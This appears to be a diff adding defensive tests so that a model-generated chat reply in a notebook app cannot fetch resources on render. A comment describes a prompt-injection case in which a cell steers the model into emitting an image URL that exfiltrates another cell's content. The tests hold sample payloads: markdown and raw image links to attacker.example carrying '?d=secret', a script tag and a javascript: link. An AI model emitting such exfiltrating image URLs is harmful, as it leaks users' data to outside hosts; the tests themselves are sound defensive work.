@@ -30,6 +30,7 @@ import { describe, it, expect } from 'vitest';
 import {
 	renderMarkdown,
 	renderOutputMarkdown,
+	renderChatReply,
 	MARKDOWN_SANITIZE_CONFIG
 } from '../../src/lib/markdown';
 
@@ -290,5 +291,82 @@ describe('ordinary markdown is unchanged', () => {
 		const fenced = dom(renderMarkdown('```\n$x^2$\n```\n'));
 		expect(fenced.querySelector('.katex')).toBeNull();
 		expect(fenced.querySelector('pre code')?.textContent?.trim()).toBe('$x^2$');
+	});
+});
+
+/**
+ * A MODEL-GENERATED chat reply is the one markdown surface whose author is not
+ * the user. Its transcript is built from cell SOURCE and stored OUTPUT, so a
+ * prompt-injecting cell can steer the model into emitting an image URL that
+ * carries ANOTHER cell's content - a zero-click GET fired on render, and again
+ * on every reload since the reply is persisted. Nothing in a reply may fetch.
+ */
+describe('a chat reply cannot fetch on render', () => {
+	/** Every element in a fragment that a browser would load a subresource for. */
+	const fetchingElements = (html: string): string[] =>
+		Array.from(dom(html).querySelectorAll('img, picture, source, video, audio, track, embed, object, iframe, input')).map(
+			(el) => el.tagName.toLowerCase()
+		);
+
+	it('a markdown image becomes its alt text, never a loading element', () => {
+		const html = renderChatReply('Here you go: ![the summary chart](https://attacker.example/?d=secret)');
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).not.toContain('attacker.example');
+		expect(dom(html).textContent).toContain('the summary chart');
+	});
+
+	it('an image with no alt shows its URL as plain text, so nothing is silently dropped', () => {
+		const html = renderChatReply('![](https://attacker.example/pixel.gif?d=secret)');
+		expect(fetchingElements(html)).toEqual([]);
+		// Visible as text the user can read - and text cannot issue a request.
+		expect(dom(html).textContent).toContain('https://attacker.example/pixel.gif?d=secret');
+		expect(dom(html).querySelector('a')).toBeNull();
+	});
+
+	it('every markdown image form is neutralised, not just the inline one', () => {
+		for (const src of [
+			'![alt][ref]\n\n[ref]: https://attacker.example/x.png',
+			'![alt](data:image/png;base64,iVBORw0KGgo=)'
+		]) {
+			const html = renderChatReply(src);
+			expect(fetchingElements(html)).toEqual([]);
+			expect(html).not.toContain('attacker.example');
+			expect(html).not.toContain('data:image');
+		}
+	});
+
+	it('a raw <img> is inert as it always was: html:false escapes it to text', () => {
+		const html = renderChatReply('<img src="https://attacker.example/raw.png">');
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).toContain('&lt;img'); // shown as source, never parsed as markup
+	});
+
+	it('links stay clickable - a click is deliberate, a render is not', () => {
+		const a = dom(renderChatReply('[the docs](https://example.com/docs)')).querySelector('a');
+		expect(a?.getAttribute('href')).toBe('https://example.com/docs');
+		expect(a?.textContent).toBe('the docs');
+	});
+
+	it('keeps every other property of the prose renderer: math, tables, and inertness', () => {
+		expect(dom(renderChatReply('$x^2$')).querySelector('.katex')).not.toBeNull();
+		const table = '| a | b |\n|---|---|\n| 1 | 2 |\n';
+		expect(renderChatReply(table)).toBe(renderMarkdown(table));
+		expectInert(renderChatReply('<script>alert(1)</script>'));
+		expect(dom(renderChatReply('[click](javascript:alert(1))')).querySelector('a')?.getAttribute('href') ?? '').not.toContain(
+			'javascript:'
+		);
+	});
+
+	it('leaves the AUTHORED markdown surfaces byte-unchanged (a different trust class)', () => {
+		// The profile is scoped to replies: a user's own markdown cell still renders
+		// its images, before and after any chat reply has been rendered.
+		const src = 'text ![chart](https://example.com/chart.png) more';
+		const before = renderMarkdown(src);
+		renderChatReply('![x](https://attacker.example/x.png)');
+		const after = renderMarkdown(src);
+		expect(after).toBe(before);
+		expect(dom(after).querySelector('img')?.getAttribute('src')).toBe('https://example.com/chart.png');
+		// The output renderer keeps its images too.
+		expect(dom(renderOutputMarkdown(src)).querySelector('img')).not.toBeNull();
 	});
 });
